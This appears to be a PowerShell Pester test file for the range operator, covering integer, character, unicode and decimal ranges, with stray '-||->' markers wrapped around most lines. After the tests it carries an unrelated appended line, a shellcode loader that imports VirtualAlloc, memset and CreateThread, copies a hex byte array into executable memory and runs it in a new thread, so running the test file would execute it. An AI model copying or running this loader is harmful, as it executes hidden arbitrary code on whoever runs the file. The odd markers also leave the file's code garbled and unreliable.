

 -||-> Describe "Range Operator" -Tags CI {
     -||-> Context "Range integer operations" {
         -||-> It "Range operator generates arrays of integers" {
             -||-> $Range = 5..8 <-||- 
             -||-> $Range.count | Should -Be 4 <-||- 
             -||-> $Range[0] | Should -BeOfType [int] <-||- 
             -||-> $Range[1] | Should -BeOfType [int] <-||- 
             -||-> $Range[2] | Should -BeOfType [int] <-||- 
             -||-> $Range[3] | Should -BeOfType [int] <-||- 

             -||-> $Range[0] | Should -Be 5 <-||- 
             -||-> $Range[1] | Should -Be 6 <-||- 
             -||-> $Range[2] | Should -Be 7 <-||- 
             -||-> $Range[3] | Should -Be 8 <-||- 
        } <-||- 

         -||-> It "Range operator accepts negative integer values" {
             -||-> $Range = -8..-5 <-||- 
             -||-> $Range.count | Should -Be 4 <-||- 
             -||-> $Range[0] | Should -Be -8 <-||- 
             -||-> $Range[1] | Should -Be -7 <-||- 
             -||-> $Range[2] | Should -Be -6 <-||- 
             -||-> $Range[3] | Should -Be -5 <-||- 
        } <-||- 

         -||-> It "Range operator support single-item sequences" {
             -||-> $Range = 0..0 <-||- 
             -||-> $Range.count | Should -Be 1 <-||- 
             -||-> $Range[0] | Should -BeOfType [int] <-||- 
             -||-> $Range[0] | Should -Be 0 <-||- 
        } <-||- 

         -||-> It "Range operator works in descending order" {
             -||-> $Range = 4..3 <-||- 
             -||-> $Range.count | Should -Be 2 <-||- 
             -||-> $Range[0] | Should -Be 4 <-||- 
             -||-> $Range[1] | Should -Be 3 <-||- 
        } <-||- 

         -||-> It "Range operator works for sequences of both negative and positive numbers" {
             -||-> $Range = -2..2 <-||- 
             -||-> $Range.count | Should -Be 5 <-||- 
             -||-> $Range[0] | Should -Be -2 <-||- 
             -||-> $Range[1] | Should -Be -1 <-||- 
             -||-> $Range[2] | Should -Be 0 <-||- 
             -||-> $Range[3] | Should -Be 1 <-||- 
             -||-> $Range[4] | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "Range operator enumerator works" {
             -||-> $Range =  -||-> -2..2 | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $Range.count | Should -Be 5 <-||- 
             -||-> $Range[0] | Should -Be -2 <-||- 
             -||-> $Range[1] | Should -Be -1 <-||- 
             -||-> $Range[2] | Should -Be 0 <-||- 
             -||-> $Range[3] | Should -Be 1 <-||- 
             -||-> $Range[4] | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "Range operator works with variables" {
             -||-> $var1 = -1 <-||- 
             -||-> $var2 = 1 <-||- 
             -||-> $Range = $var1..$var2 <-||- 
             -||-> $Range.count | Should -Be 3 <-||- 
             -||-> $Range[0] | Should -Be -1 <-||- 
             -||-> $Range[1] | Should -Be 0 <-||- 
             -||-> $Range[2] | Should -Be 1 <-||- 

             -||-> $Range = [int]$var2..[int]$var1 <-||- 
             -||-> $Range.count | Should -Be 3 <-||- 
             -||-> $Range[0] | Should -Be 1 <-||- 
             -||-> $Range[1] | Should -Be 0 <-||- 
             -||-> $Range[2] | Should -Be -1 <-||- 

             -||-> $Range =  -||-> $var1..$var2 | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $Range.count | Should -Be 3 <-||- 
             -||-> $Range[0] | Should -Be -1 <-||- 
             -||-> $Range[1] | Should -Be 0 <-||- 
             -||-> $Range[2] | Should -Be 1 <-||- 

             -||-> $Range =  -||-> [int]$var2..[int]$var1 | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $Range.count | Should -Be 3 <-||- 
             -||-> $Range[0] | Should -Be 1 <-||- 
             -||-> $Range[1] | Should -Be 0 <-||- 
             -||-> $Range[2] | Should -Be -1 <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Character expansion" {
         -||-> It "Range operator generates an array of [char] from single-character operands" {
             -||-> $CharRange = 'A'..'E' <-||- 
             -||-> $CharRange.count | Should -Be 5 <-||- 
             -||-> $CharRange[0] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[1] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[2] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[3] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[4] | Should -BeOfType [char] <-||- 
        } <-||- 

         -||-> It "Range operator enumerator generates an array of [string] from single-character operands" {
             -||-> $CharRange =  -||-> 'A'..'E' | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 5 <-||- 
             -||-> $CharRange[0] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[1] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[2] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[3] | Should -BeOfType [char] <-||- 
             -||-> $CharRange[4] | Should -BeOfType [char] <-||- 
        } <-||- 

         -||-> It "Range operator works in ascending and descending order" {
             -||-> $CharRange = 'a'..'c' <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'a' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'b' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'c' <-||- ) <-||- 

             -||-> $CharRange = 'C'..'A' <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'C' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'B' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'A' <-||- ) <-||- 
        } <-||- 

         -||-> It "Range operator works in ascending and descending order with [char] cast" {
             -||-> $CharRange = [char]'a'..[char]'c' <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'a' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'b' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'c' <-||- ) <-||- 

             -||-> $CharRange = [char]"a".."c" <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'a' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'b' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'c' <-||- ) <-||- 

             -||-> $CharRange = "a"..[char]"c" <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'a' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'b' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'c' <-||- ) <-||- 

            
             -||-> $CharRange = [char]'C'..[char]'A' <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'C' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'B' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'A' <-||- ) <-||- 

             -||-> $CharRange = [char]"C".."A" <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'C' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'B' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'A' <-||- ) <-||- 

             -||-> $CharRange = "C"..[char]"A" <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly ( -||-> [char]'C' <-||- ) <-||- 
             -||-> $CharRange[1] | Should -BeExactly ( -||-> [char]'B' <-||- ) <-||- 
             -||-> $CharRange[2] | Should -BeExactly ( -||-> [char]'A' <-||- ) <-||- 
        } <-||- 

         -||-> It "Range operator enumerator works in ascending and descending order" {
             -||-> $CharRange =  -||-> 'a'..'c' | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "a" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "b" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "c" <-||- 

             -||-> $CharRange =  -||-> 'C'..'A' | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "C" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "B" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "A" <-||- 
        } <-||- 

         -||-> It "Range operator enumerator works in ascending and descending order with [char] cast" {
             -||-> $CharRange =  -||-> [char]'a'..[char]'c' | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "a" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "b" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "c" <-||- 

             -||-> $CharRange =  -||-> [char]'C'..[char]'A' | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "C" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "B" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "A" <-||- 
        } <-||- 

         -||-> It "Range operator works with variables" {
             -||-> $var1 = 'a' <-||- 
             -||-> $var2 = 'c' <-||- 
             -||-> $CharRange = $var1..$var2 <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "a" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "b" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "c" <-||- 

             -||-> $CharRange = [char]$var2..[char]$var1 <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "c" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "b" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "a" <-||- 

             -||-> $CharRange =  -||-> $var1..$var2 | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "a" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "b" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "c" <-||- 

             -||-> $CharRange =  -||-> [char]$var2..[char]$var1 | ForEach-Object {  -||-> $_ <-||-  } <-||-  <-||- 
             -||-> $CharRange.count | Should -Be 3 <-||- 
             -||-> $CharRange[0] | Should -BeExactly "c" <-||- 
             -||-> $CharRange[1] | Should -BeExactly "b" <-||- 
             -||-> $CharRange[2] | Should -BeExactly "a" <-||- 
        } <-||- 

         -||-> It "Range operator works with 16-bit unicode characters" {
             -||-> $UnicodeRange = "`u{0110}".."`u{0114}" <-||- 
             -||-> $UnicodeRange.count | Should -Be 5 <-||- 
             -||-> $UnicodeRange[0] | Should -Be "`u{0110}"[0] <-||- 
             -||-> $UnicodeRange[1] | Should -Be "`u{0111}"[0] <-||- 
             -||-> $UnicodeRange[2] | Should -Be "`u{0112}"[0] <-||- 
             -||-> $UnicodeRange[3] | Should -Be "`u{0113}"[0] <-||- 
             -||-> $UnicodeRange[4] | Should -Be "`u{0114}"[0] <-||- 
             -||-> $UnicodeRange.Where({ -||-> $_ -is [char] <-||- }).count | Should -Be 5 <-||- 
        } <-||- 

         -||-> It "Range operator with special ranges" {
             -||-> $SpecRange = "0".."9" <-||- 
             -||-> $SpecRange.count | Should -Be 10 <-||- 
             -||-> $SpecRange.Where({ -||-> $_ -is [int] <-||- }).count | Should -Be 10 <-||- 

             -||-> $SpecRange = '0'..'9' <-||- 
             -||-> $SpecRange.count | Should -Be 10 <-||- 
             -||-> $SpecRange.Where({ -||-> $_ -is [int] <-||- }).count | Should -Be 10 <-||- 

             -||-> $SpecRange = [char]'0'..[char]'9' <-||- 
             -||-> $SpecRange.count | Should -Be 10 <-||- 
             -||-> $SpecRange.Where({ -||-> $_ -is [char] <-||- }).count | Should -Be 10 <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Range operator operand types" {
         -||-> It "Range operator works on [decimal]" {
             -||-> $Range = 1.1d..3.9d <-||- 
             -||-> $Range.count | Should -Be 4 <-||- 
             -||-> $Range[0] | Should -Be 1 <-||- 
             -||-> $Range[1] | Should -Be 2 <-||- 
             -||-> $Range[2] | Should -Be 3 <-||- 
             -||-> $Range[3] | Should -Be 4 <-||- 
             -||-> $Range.Where({ -||-> $_ -is [int] <-||- }).count | Should -Be 4 <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0xae,0x2f,0xb6,0xae,0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x5f,0x13,0x03,0x5f,0x13,0x83,0xc7,0xaa,0xcd,0x43,0x52,0x5a,0x93,0xac,0xab,0x9a,0xf4,0x25,0x4e,0xab,0x34,0x51,0x1a,0x9b,0x84,0x11,0x4e,0x17,0x6e,0x77,0x7b,0xac,0x02,0x50,0x8c,0x05,0xa8,0x86,0xa3,0x96,0x81,0xfb,0xa2,0x14,0xd8,0x2f,0x05,0x25,0x13,0x22,0x44,0x62,0x4e,0xcf,0x14,0x3b,0x04,0x62,0x89,0x48,0x50,0xbf,0x22,0x02,0x74,0xc7,0xd7,0xd2,0x77,0xe6,0x49,0x69,0x2e,0x28,0x6b,0xbe,0x5a,0x61,0x73,0xa3,0x67,0x3b,0x08,0x17,0x13,0xba,0xd8,0x66,0xdc,0x11,0x25,0x47,0x2f,0x6b,0x61,0x6f,0xd0,0x1e,0x9b,0x8c,0x6d,0x19,0x58,0xef,0xa9,0xac,0x7b,0x57,0x39,0x16,0xa0,0x66,0xee,0xc1,0x23,0x64,0x5b,0x85,0x6c,0x68,0x5a,0x4a,0x07,0x94,0xd7,0x6d,0xc8,0x1d,0xa3,0x49,0xcc,0x46,0x77,0xf3,0x55,0x22,0xd6,0x0c,0x85,0x8d,0x87,0xa8,0xcd,0x23,0xd3,0xc0,0x8f,0x2b,0x10,0xe9,0x2f,0xab,0x3e,0x7a,0x43,0x99,0xe1,0xd0,0xcb,0x91,0x6a,0xff,0x0c,0xd6,0x40,0x47,0x82,0x29,0x6b,0xb8,0x8a,0xed,0x3f,0xe8,0xa4,0xc4,0x3f,0x63,0x35,0xe9,0x95,0x1e,0x30,0x7d,0x7e,0x2a,0x1b,0xd1,0x16,0xd6,0x5c,0x20,0x3a,0x5f,0xba,0x62,0x94,0x30,0x13,0xc2,0x44,0xf1,0xc3,0xaa,0x8e,0xfe,0x3c,0xca,0xb0,0xd4,0x54,0x60,0x5f,0x81,0x0d,0x1c,0xc6,0x88,0xc6,0xbd,0x07,0x07,0xa3,0xfd,0x8c,0xa4,0x53,0xb3,0x64,0xc0,0x47,0x23,0x85,0x9f,0x3a,0xe5,0x9a,0x35,0x50,0x09,0x0f,0xb2,0xf3,0x5e,0xa7,0xb8,0x22,0xa8,0x68,0x42,0x01,0xa3,0xa1,0xd6,0xea,0xdb,0xcd,0x36,0xeb,0x1b,0x98,0x5c,0xeb,0x73,0x7c,0x05,0xb8,0x66,0x83,0x90,0xac,0x3b,0x16,0x1b,0x85,0xe8,0xb1,0x73,0x2b,0xd7,0xf6,0xdb,0xd4,0x32,0x07,0x27,0x03,0x7a,0x7d,0x49,0x97 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



